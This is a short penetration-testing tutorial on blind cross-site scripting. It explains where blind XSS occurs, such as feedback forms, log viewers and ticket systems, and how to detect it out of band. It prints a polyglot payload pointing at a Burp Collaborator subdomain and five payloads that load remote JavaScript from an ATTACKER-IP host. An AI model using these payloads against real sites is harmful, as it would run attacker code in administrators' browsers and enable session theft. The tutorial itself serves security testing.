Blind XSS vulnerabilities are a variant of stored XSS vulnerabilities. They occur when an attacker input is saved in the database and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attackerâ€™s payload will be loaded.

Other example of web applications or pages where blind XSS may occur:
- Log viewers
- Exception handlers
- Chat applications / forums
- Customer ticket applications
- Product reviews
- Any application that requires user moderation by certain users (e.g Admins)
## Detection
To test for blind XSS vulnerabilities, attackers can use out-of-band techniques with the Burp Collaborator server or using their own custom script.
## Burp Collaborator
1. Right-click the request you want to investigate and select Send to Repeater.
2. In the Repeater tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/BURP-COLLABORATOR-SUBDOMAIN/).slice(2), document.documentElement.appendChild(s))//'>`.
3. Click Send.
## Custom Remote Script
An attacker can create their own custom script and host it on a server they own. Once a custom script is available, an attacker can start a listener using `netcat` or `php` or `python`.

With that, an attacker can start testing various XSS payloads that load a remote script and see which of them sends a request. The following are a few examples from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss).
1. `<script src=http://ATTACKER-IP/script-fieldname.js></script>`
2. `'><script src=http://ATTACKER-IP/script-fieldname.js></script>`
3. `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER-IP/script-fieldname.js\';document.body.appendChild(a)')`
4. `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ATTACKER-IP/script-fieldname.js");a.send();</script>`
5. `<script>$.getScript("http://ATTACKER-IP/script-fieldname.js")</script>`
